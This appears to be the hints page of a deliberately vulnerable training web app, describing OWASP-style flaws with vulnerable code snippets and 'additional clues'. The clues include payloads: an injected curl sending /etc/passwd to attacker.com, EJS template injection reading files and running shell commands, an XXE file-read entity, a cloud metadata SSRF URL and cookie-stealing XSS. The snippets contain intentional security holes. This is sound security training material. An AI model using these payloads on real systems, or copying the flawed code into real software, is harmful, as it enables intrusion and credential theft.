<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NULL: HACKER GUIDE - Vulnerability Training Archive</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #000;
            color: #00ff88;
            font-family: 'Fira Code', 'Share Tech Mono', monospace;
            overflow-x: hidden;
        }
        
        /* Animated cyber grid background */
        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: grid-scroll 20s linear infinite;
            z-index: 0;
        }
        
        @keyframes grid-scroll {
            0% { transform: perspective(500px) rotateX(60deg) translateY(0); }
            100% { transform: perspective(500px) rotateX(60deg) translateY(50px); }
        }
        
        /* Scanline effect */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                to bottom,
                rgba(0, 255, 136, 0) 0%,
                rgba(0, 255, 136, 0.02) 50%,
                rgba(0, 255, 136, 0) 100%
            );
            background-size: 100% 3px;
            animation: scan 8s linear infinite;
            pointer-events: none;
            z-index: 999;
        }
        
        @keyframes scan {
            0% { background-position: 0 0; }
            100% { background-position: 0 100vh; }
        }
        
        .container {
            position: relative;
            z-index: 1;
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Epic glowing header */
        .hacker-header {
            font-family: 'Orbitron', monospace;
            font-size: 5rem;
            font-weight: 900;
            text-align: center;
            margin: 80px 0 30px;
            background: linear-gradient(45deg, #00ff88, #0ff, #00ff88, #0ff);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient-flow 3s ease infinite, glow-pulse 2s ease-in-out infinite;
            position: relative;
            text-shadow: 0 0 80px rgba(0, 255, 136, 0.8);
        }
        
        @keyframes gradient-flow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes glow-pulse {
            0%, 100% { filter: brightness(1) drop-shadow(0 0 20px #00ff88); }
            50% { filter: brightness(1.5) drop-shadow(0 0 40px #0ff); }
        }
        
        .subtitle {
            text-align: center;
            font-size: 1.5rem;
            color: #0ff;
            margin-bottom: 60px;
            letter-spacing: 3px;
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            45% { opacity: 1; }
            50% { opacity: 0.8; }
            55% { opacity: 1; }
        }
        
        /* Terminal-style navigation */
        .terminal-nav {
            background: rgba(0, 20, 10, 0.8);
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 50px;
            box-shadow: 0 0 50px rgba(0, 255, 136, 0.3), inset 0 0 30px rgba(0, 255, 136, 0.05);
        }
        
        .terminal-nav::before {
            content: 'NULL:~$ ls -la /vulnerabilities';
            display: block;
            color: #0ff;
            margin-bottom: 15px;
            font-family: 'Fira Code', monospace;
            font-size: 1.1rem;
        }
        
        .nav-links {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }
        
        .nav-link {
            background: rgba(0, 255, 136, 0.05);
            border: 1px solid #00ff88;
            padding: 12px 20px;
            text-decoration: none;
            color: #00ff88;
            transition: all 0.3s;
            display: block;
            text-align: center;
            border-radius: 5px;
            position: relative;
            overflow: hidden;
        }
        
        .nav-link::before {
            content: '>';
            position: absolute;
            left: 10px;
            opacity: 0;
            transition: all 0.3s;
        }
        
        .nav-link:hover {
            background: rgba(0, 255, 136, 0.2);
            border-color: #0ff;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
            padding-left: 30px;
            color: #0ff;
        }
        
        .nav-link:hover::before {
            opacity: 1;
            left: 15px;
        }
        
        /* Vulnerability cards */
        .vuln-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        
        .vuln-card {
            background: rgba(0, 20, 10, 0.6);
            border: 2px solid #00ff88;
            border-radius: 15px;
            padding: 30px;
            position: relative;
            overflow: hidden;
            transition: all 0.4s;
            box-shadow: 0 5px 30px rgba(0, 255, 136, 0.1);
        }
        
        .vuln-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.1), transparent);
            transform: rotate(45deg);
            animation: card-shine 6s infinite;
        }
        
        @keyframes card-shine {
            0%, 100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            50% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        
        .vuln-card:hover {
            transform: translateY(-10px) scale(1.02);
            border-color: #0ff;
            box-shadow: 0 15px 60px rgba(0, 255, 136, 0.4);
        }
        
        .vuln-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        
        .vuln-icon {
            font-size: 3rem;
            animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .vuln-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            color: #0ff;
            text-shadow: 0 0 10px #0ff;
        }
        
        .severity {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 16px;
            border-radius: 5px;
            font-size: 0.9rem;
            font-weight: bold;
            letter-spacing: 1px;
            z-index: 1;
            animation: pulse-severity 2s infinite;
        }
        
        @keyframes pulse-severity {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .severity.critical {
            background: rgba(255, 0, 64, 0.3);
            border: 2px solid #ff0040;
            color: #ff0040;
            box-shadow: 0 0 20px rgba(255, 0, 64, 0.5);
        }
        
        .severity.high {
            background: rgba(255, 136, 0, 0.3);
            border: 2px solid #ff8800;
            color: #ff8800;
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.5);
        }
        
        .severity.medium {
            background: rgba(255, 255, 0, 0.3);
            border: 2px solid #ffff00;
            color: #ffff00;
            box-shadow: 0 0 20px rgba(255, 255, 0, 0.5);
        }
        
        .vuln-description {
            line-height: 1.8;
            margin-bottom: 20px;
            color: #00ff88;
            position: relative;
            z-index: 1;
        }
        
        .hint-box {
            background: rgba(0, 255, 255, 0.05);
            border-left: 4px solid #0ff;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            position: relative;
            z-index: 1;
        }
        
        .hint-box::before {
            content: 'üí° HINT: ';
            color: #0ff;
            font-weight: bold;
        }
        
        .challenge-box {
            background: rgba(255, 0, 64, 0.05);
            border: 1px dashed #ff0040;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            position: relative;
            z-index: 1;
        }
        
        .challenge-box::before {
            content: 'üéØ CHALLENGE: ';
            color: #ff0040;
            font-weight: bold;
        }
        
        .code-example {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #00ff88;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            font-family: 'Fira Code', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            position: relative;
            z-index: 1;
        }
        
        .code-example::before {
            content: '// Vulnerable Code Example';
            display: block;
            color: #ff0040;
            margin-bottom: 10px;
            font-size: 0.8rem;
        }
        
        .endpoint-badge {
            display: inline-block;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            padding: 5px 12px;
            border-radius: 3px;
            font-size: 0.85rem;
            margin: 5px 5px 5px 0;
            color: #00ff88;
        }
        
        /* Collapse/Expand */
        .expand-btn {
            background: transparent;
            border: 1px solid #0ff;
            color: #0ff;
            padding: 10px 20px;
            cursor: pointer;
            margin-top: 15px;
            border-radius: 5px;
            font-family: 'Fira Code', monospace;
            transition: all 0.3s;
            position: relative;
            z-index: 1;
        }
        
        .expand-btn:hover {
            background: #0ff;
            color: #000;
            box-shadow: 0 0 20px #0ff;
        }
        
        .expanded-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s ease;
        }
        
        .expanded-content.active {
            max-height: 2000px;
        }
        
        /* Statistics dashboard */
        .stats-dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 50px 0;
        }
        
        .stat-card {
            background: rgba(0, 20, 10, 0.6);
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            border-color: #0ff;
            box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
        }
        
        .stat-number {
            font-size: 3rem;
            font-weight: 900;
            color: #0ff;
            font-family: 'Orbitron', monospace;
            margin-bottom: 10px;
            text-shadow: 0 0 20px #0ff;
        }
        
        .stat-label {
            color: #00ff88;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-size: 0.9rem;
        }
        
        /* Warning banner */
        .warning-banner {
            background: rgba(255, 0, 64, 0.1);
            border: 2px solid #ff0040;
            border-radius: 10px;
            padding: 30px;
            margin: 40px 0;
            text-align: center;
            animation: pulse-warning 3s infinite;
        }
        
        @keyframes pulse-warning {
            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 64, 0.3); }
            50% { box-shadow: 0 0 30px rgba(255, 0, 64, 0.6); }
        }
        
        .warning-banner h2 {
            color: #ff0040;
            font-family: 'Orbitron', monospace;
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        @media (max-width: 768px) {
            .hacker-header { font-size: 2.5rem; }
            .subtitle { font-size: 1rem; }
            .vuln-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="scanline"></div>
    
    <div class="container">
        <h1 class="hacker-header">‚ö° NULL: HACKER GUIDE ‚ö°</h1>
        <div class="subtitle">[ VULNERABILITY TRAINING ARCHIVE - NO ANSWERS GIVEN ]</div>
        
        <div class="terminal-nav">
            <div class="nav-links">
                <a href="/" class="nav-link">Home</a>
                <a href="/cases" class="nav-link">Cases</a>
                <a href="/donate" class="nav-link">Donate</a>
                <a href="/subscribe" class="nav-link">Inner Circle</a>
            </div>
        </div>
        
        <div class="warning-banner">
            <h2>‚ö† ETHICAL HACKING ONLY ‚ö†</h2>
            <p>This platform is for security training purposes. All vulnerabilities are intentional.</p>
            <p>Use this knowledge responsibly to defend systems, not attack them.</p>
            <p><strong>Unauthorized access to real systems is ILLEGAL.</strong></p>
        </div>
        
        <div class="stats-dashboard">
            <div class="stat-card">
                <div class="stat-number">105+</div>
                <div class="stat-label">Vulnerabilities</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">10</div>
                <div class="stat-label">OWASP Top 10</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">100+</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">‚àû</div>
                <div class="stat-label">Learning Paths</div>
            </div>
        </div>
        
        <div class="vuln-grid">
            <!-- SQL Injection -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üíâ</span>
                    <h2 class="vuln-title">SQL Injection</h2>
                </div>
                <div class="vuln-description">
                    One of the most devastating attacks. Allows attackers to manipulate database queries, bypassing authentication and extracting sensitive data.
                </div>
                <div class="hint-box">
                    Look at the login form. Notice how user input might be directly concatenated into SQL queries. What if you could "escape" from the intended query structure?
                </div>
                <div class="challenge-box">
                    Can you log in without knowing any valid password? Try thinking about how SQL WHERE clauses work. What would make a condition always evaluate to true?
                </div>
                <div class="code-example">
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/auth/login</span>
                <span class="endpoint-badge">GET /api/cases/search</span>
                <span class="endpoint-badge">GET /api/cases/exists/:id</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Think about SQL comment syntax (-- or #)</p>
                    <p>‚Ä¢ Consider boolean logic (OR operators)</p>
                    <p>‚Ä¢ The classic: ' OR '1'='1</p>
                    <p>‚Ä¢ Try different quote types: single (') vs double (")</p>
                    <p>‚Ä¢ Look for error messages that reveal query structure</p>
                    <p>‚Ä¢ Blind SQLi uses timing: SLEEP(), WAITFOR DELAY</p>
                </div>
            </div>
            
            <!-- Broken Authentication -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîì</span>
                    <h2 class="vuln-title">Broken Authentication</h2>
                </div>
                <div class="vuln-description">
                    Multiple authentication weaknesses exist. JWT tokens are improperly validated, sessions persist unnecessarily, and password reset mechanisms are flawed.
                </div>
                <div class="hint-box">
                    JWT tokens have three parts: header, payload, signature. What if the signature isn't properly verified? Also check how tokens are decoded vs verified.
                </div>
                <div class="challenge-box">
                    Can you access admin functionality without the admin password? Look at how JWTs are handled. Can you modify the payload? What about the 'algorithm' field?
                </div>
                <div class="code-example">
const decoded = jwt.decode(token);  // No verification!
if (decoded) { return decoded; }
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/auth/verify-token</span>
                <span class="endpoint-badge">POST /api/auth/forgot-password</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ jwt.decode() vs jwt.verify() - big difference!</p>
                    <p>‚Ä¢ Try changing the 'alg' header to 'none'</p>
                    <p>‚Ä¢ Modify role/isSubscribed in JWT payload</p>
                    <p>‚Ä¢ Password reset tokens in /api/auth/forgot-password response</p>
                    <p>‚Ä¢ Cookies set without HttpOnly flag - accessible via JavaScript</p>
                </div>
            </div>
            
            <!-- IDOR -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîë</span>
                    <h2 class="vuln-title">Insecure Direct Object Reference (IDOR)</h2>
                </div>
                <div class="vuln-description">
                    Access other users' data by simply changing ID numbers in the URL. No authorization checks verify you should see that data.
                </div>
                <div class="hint-box">
                    When you view your own profile, notice the user ID in the URL. What happens if you increment or decrement that number? Are there any checks preventing you from accessing other users?
                </div>
                <div class="challenge-box">
                    Can you view the admin's profile (user ID: 1)? Can you modify another user's data? Try PUT requests with different user IDs.
                </div>
                <div class="code-example">
app.get('/api/user/:id', async (req, res) => {
    const user = await dbGet('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json(user);  // No auth check!
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/user/:id</span>
                <span class="endpoint-badge">PUT /api/user/:id</span>
                <span class="endpoint-badge">GET /api/donations/:userId</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try user IDs: 1 (admin), 2, 3, 4</p>
                    <p>‚Ä¢ Look at the response - plaintext passwords exposed!</p>
                    <p>‚Ä¢ PUT /api/user/:id accepts role changes</p>
                    <p>‚Ä¢ Change your own role to 'admin' via IDOR</p>
                    <p>‚Ä¢ No session validation on these endpoints</p>
                </div>
            </div>
            
            <!-- XSS -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé≠</span>
                    <h2 class="vuln-title">Cross-Site Scripting (XSS)</h2>
                </div>
                <div class="vuln-description">
                    Inject malicious JavaScript that executes in other users' browsers. Both stored (persistent) and reflected XSS vulnerabilities exist.
                </div>
                <div class="hint-box">
                    User input is rendered directly into HTML without sanitization. Try injecting &lt;script&gt; tags in comments, search queries, and URL parameters.
                </div>
                <div class="challenge-box">
                    Can you make an alert box appear? Try posting comments with JavaScript code. Also check the /error endpoint with a 'message' parameter.
                </div>
                <div class="code-example">
// Reflected XSS
res.send(`&lt;p&gt;${message}&lt;/p&gt;`);

// Stored XSS  
await dbRun('INSERT INTO comments (content) VALUES (?)', [userInput]);
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/comments</span>
                <span class="endpoint-badge">GET /error?message=</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Basic payload: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                    <p>‚Ä¢ Try: &lt;img src=x onerror=alert(1)&gt;</p>
                    <p>‚Ä¢ Stored XSS in case comments persists</p>
                    <p>‚Ä¢ Reflected XSS in /error?message=&lt;script&gt;...&lt;/script&gt;</p>
                    <p>‚Ä¢ Cookie theft: document.cookie in your XSS payload</p>
                </div>
            </div>
            
            <!-- Command Injection -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üíª</span>
                    <h2 class="vuln-title">Command Injection</h2>
                </div>
                <div class="vuln-description">
                    User input is passed directly to system shell commands. Allows arbitrary command execution on the server.
                </div>
                <div class="hint-box">
                    The report submission feature logs data using shell commands. Think about shell command separators and how to chain multiple commands together.
                </div>
                <div class="challenge-box">
                    Can you make the server execute your own commands? Try characters like ; & | or $() in the report title field.
                </div>
                <div class="code-example">
const logCommand = `echo "Report: ${title}" >> reports.log`;
exec(logCommand);  // Dangerous!
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/report</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Windows: title; whoami or title & dir</p>
                    <p>‚Ä¢ Linux: title; ls -la or title $(whoami)</p>
                    <p>‚Ä¢ Command separators: ; && || | &</p>
                    <p>‚Ä¢ Try: test; curl http://attacker.com?data=$(cat /etc/passwd)</p>
                    <p>‚Ä¢ Backticks and $() for command substitution</p>
                </div>
            </div>
            
            <!-- SSTI -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìù</span>
                    <h2 class="vuln-title">Server-Side Template Injection (SSTI)</h2>
                </div>
                <div class="vuln-description">
                    User input is rendered as template code. The EJS template engine evaluates your input, allowing code execution on the server.
                </div>
                <div class="hint-box">
                    When adding notes to cases, the content is processed by EJS. Template engines use special delimiters like <%= %> to execute code. Can you break out of plain text?
                </div>
                <div class="challenge-box">
                    Can you execute JavaScript on the server side? Try EJS syntax in case notes. Access server-side variables or require modules.
                </div>
                <div class="code-example">
const rendered = ejs.render(content, { 
    caseId: caseId, 
    secret: 'CLASSIFIED_INTEL_2024',
    apiKeys: API_KEYS 
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/cases/:id/notes</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ EJS syntax: &lt;%= expression %&gt; for output</p>
                    <p>‚Ä¢ Try: &lt;%= 7*7 %&gt; to test</p>
                    <p>‚Ä¢ Access variables: &lt;%= secret %&gt; or &lt;%= apiKeys %&gt;</p>
                    <p>‚Ä¢ Read files: &lt;%= require('fs').readFileSync('/etc/passwd').toString() %&gt;</p>
                    <p>‚Ä¢ Execute commands: &lt;%= require('child_process').execSync('whoami').toString() %&gt;</p>
                </div>
            </div>
            
            <!-- XXE -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìÑ</span>
                    <h2 class="vuln-title">XML External Entity (XXE)</h2>
                </div>
                <div class="vuln-description">
                    The whistleblower form accepts XML data. If the parser isn't configured properly, external entities can read local files or perform SSRF attacks.
                </div>
                <div class="hint-box">
                    Check how the whistleblower submission sends data - it builds XML. The DOCTYPE declaration can define external entities that reference local files.
                </div>
                <div class="challenge-box">
                    Can you read server files using XXE? Define an entity pointing to file:///etc/passwd or C:\Windows\System32\drivers\etc\hosts and reference it in the XML.
                </div>
                <div class="code-example">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE report [
  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;report&gt;&lt;content&gt;&file;&lt;/content&gt;&lt;/report&gt;
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/whistleblower/submit</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Define external entity in DOCTYPE</p>
                    <p>‚Ä¢ Reference it in XML body: &entity;</p>
                    <p>‚Ä¢ Try reading: /etc/passwd, /etc/hosts</p>
                    <p>‚Ä¢ Windows: C:\Windows\win.ini</p>
                    <p>‚Ä¢ Can also be used for SSRF to internal services</p>
                </div>
            </div>
            
            <!-- SSRF -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">Server-Side Request Forgery (SSRF)</h2>
                </div>
                <div class="vuln-description">
                    The evidence vault download feature fetches URLs provided by users. This allows you to make the server request internal resources or scan internal networks.
                </div>
                <div class="hint-box">
                    When downloading evidence files, you provide a URL. The server makes the request for you. Can you make it request localhost or internal IP addresses?
                </div>
                <div class="challenge-box">
                    Can you access internal services? Try URLs like http://localhost:3000/debug or http://127.0.0.1/admin. Can you scan for other internal ports?
                </div>
                <div class="code-example">
// User controls the URL!
const response = await fetch(userProvidedUrl);
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/download</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: http://localhost:3000/api/admin/users</p>
                    <p>‚Ä¢ Internal IPs: 127.0.0.1, 0.0.0.0, 192.168.x.x</p>
                    <p>‚Ä¢ Cloud metadata: http://169.254.169.254/latest/meta-data/</p>
                    <p>‚Ä¢ Port scanning: try different ports on localhost</p>
                    <p>‚Ä¢ File protocol: file:///etc/passwd</p>
                </div>
            </div>
            
            <!-- File Upload -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üì§</span>
                    <h2 class="vuln-title">Unrestricted File Upload</h2>
                </div>
                <div class="vuln-description">
                    No file type validation or content checking. Upload any file type including executables, scripts, or malicious files.
                </div>
                <div class="hint-box">
                    The evidence upload accepts ANY file type. No extension checking, no content-type validation, no scanning. Filenames are preserved exactly as uploaded.
                </div>
                <div class="challenge-box">
                    Can you upload a .php, .jsp, or .exe file? Can you upload a web shell? What about files with double extensions like shell.php.jpg?
                </div>
                <div class="code-example">
// NO VALIDATION!
const storage = multer.diskStorage({
    filename: (req, file, cb) => {
        cb(null, file.originalname);  // Dangerous!
    }
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/upload</span>
                <span class="endpoint-badge">POST /api/whistleblower/submit</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Upload .html files with XSS payloads</p>
                    <p>‚Ä¢ Try executable extensions: .exe, .sh, .bat</p>
                    <p>‚Ä¢ Web shells: .php, .jsp, .aspx (if processed)</p>
                    <p>‚Ä¢ Path traversal in filename: ../../../evil.sh</p>
                    <p>‚Ä¢ Files stored in public/uploads/ directory</p>
                </div>
            </div>
            
            <!-- Sensitive Data Exposure -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîê</span>
                    <h2 class="vuln-title">Sensitive Data Exposure</h2>
                </div>
                <div class="vuln-description">
                    Passwords stored in plaintext. API keys hardcoded. JWT secrets exposed. Backup files accessible. Debug endpoints reveal environment variables.
                </div>
                <div class="hint-box">
                    Look for common backup file names and debug endpoints. Check /backup.zip, /database.sqlite, /.git, /debug. User API responses include plaintext passwords.
                </div>
                <div class="challenge-box">
                    Can you find the database dump? What about API keys? Try accessing /backup.zip or /debug. Check user API responses for password fields.
                </div>
                <div class="code-example">
// Plaintext passwords in database
const user = { 
    id: 1, 
    email: 'admin@null.org', 
    password: 's3cr3t_p4ss!'  // Not hashed!
};
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /backup.zip</span>
                <span class="endpoint-badge">GET /database.sqlite</span>
                <span class="endpoint-badge">GET /api/user/:id</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ /backup.zip contains full database dump + secrets</p>
                    <p>‚Ä¢ /database.sqlite exposes user table with plaintext passwords</p>
                    <p>‚Ä¢ GET /api/user/1 includes password field</p>
                    <p>‚Ä¢ JWT_SECRET exposed in multiple places</p>
                    <p>‚Ä¢ API keys in responses and source code</p>
                </div>
            </div>
            
            <!-- Broken Access Control -->
            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üö´</span>
                    <h2 class="vuln-title">Broken Access Control</h2>
                </div>
                <div class="vuln-description">
                    Admin console accessible without authentication. Users can modify their own roles. Subscription bypass via parameter manipulation.
                </div>
                <div class="hint-box">
                    The admin panel is "hidden" but not protected. Try common admin URLs. For subscription, look at what parameters the API accepts - especially boolean flags.
                </div>
                <div class="challenge-box">
                    Can you access the admin console at /secret-admin-console? Can you subscribe without paying by manipulating request parameters?
                </div>
                <div class="code-example">
// No auth check!
app.get('/secret-admin-console', (req, res) => {
    res.sendFile('admin.html');
});

// Trust client-side flag
if (isSubscribed === true) {
    await dbRun('UPDATE users SET isSubscribed = 1');
}
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /secret-admin-console</span>
                <span class="endpoint-badge">POST /api/subscribe</span>
                <span class="endpoint-badge">PUT /api/user/:id</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Navigate directly to /secret-admin-console</p>
                    <p>‚Ä¢ Subscribe with: {"isSubscribed": true} in POST body</p>
                    <p>‚Ä¢ Change role via PUT /api/user/:id with {"role": "admin"}</p>
                    <p>‚Ä¢ Inner circle page: /inner-circle-secret-archives</p>
                    <p>‚Ä¢ No session validation on admin routes</p>
                </div>
            </div>
            
            <!-- Open Redirect -->
            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚ÜóÔ∏è</span>
                    <h2 class="vuln-title">Open Redirect</h2>
                </div>
                <div class="vuln-description">
                    Unvalidated redirect endpoint. Useful for phishing attacks by making malicious links appear to come from a trusted domain.
                </div>
                <div class="hint-box">
                    The /redirect endpoint takes a URL parameter and redirects to it without validation. Craft links that appear legitimate but redirect to attacker sites.
                </div>
                <div class="challenge-box">
                    Can you create a link that starts with this domain but redirects to evil.com? Try /redirect?url=https://evil.com
                </div>
                <div class="code-example">
app.get('/redirect', (req, res) => {
    const { url } = req.query;
    res.redirect(url);  // No validation!
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /redirect?url=</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Craft: http://localhost:3000/redirect?url=https://evil.com</p>
                    <p>‚Ä¢ Looks trustworthy but redirects to attacker site</p>
                    <p>‚Ä¢ Perfect for phishing campaigns</p>
                    <p>‚Ä¢ Can bypass URL filters in emails</p>
                    <p>‚Ä¢ Try javascript: URLs for XSS combo</p>
                </div>
            </div>
            
            <!-- Mass Assignment -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚öôÔ∏è</span>
                    <h2 class="vuln-title">Mass Assignment</h2>
                </div>
                <div class="vuln-description">
                    API endpoints accept all parameters from request body without filtering. Users can modify fields they shouldn't have access to.
                </div>
                <div class="hint-box">
                    When updating user profiles or subscribing, the API doesn't whitelist allowed fields. Try adding extra parameters like role, isAdmin, isSubscribed, donationTotal.
                </div>
                <div class="challenge-box">
                    Can you give yourself admin privileges? Can you set isSubscribed to true without paying? Try adding unexpected fields to your API requests.
                </div>
                <div class="code-example">
app.put('/api/user/:id', async (req, res) => {
    const { role, isSubscribed, donationTotal } = req.body;
    // All fields accepted without validation!
    await dbRun('UPDATE users SET role = ?, isSubscribed = ? ...', 
                [role, isSubscribed, ...]);
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">PUT /api/user/:id</span>
                <span class="endpoint-badge">POST /api/subscribe</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
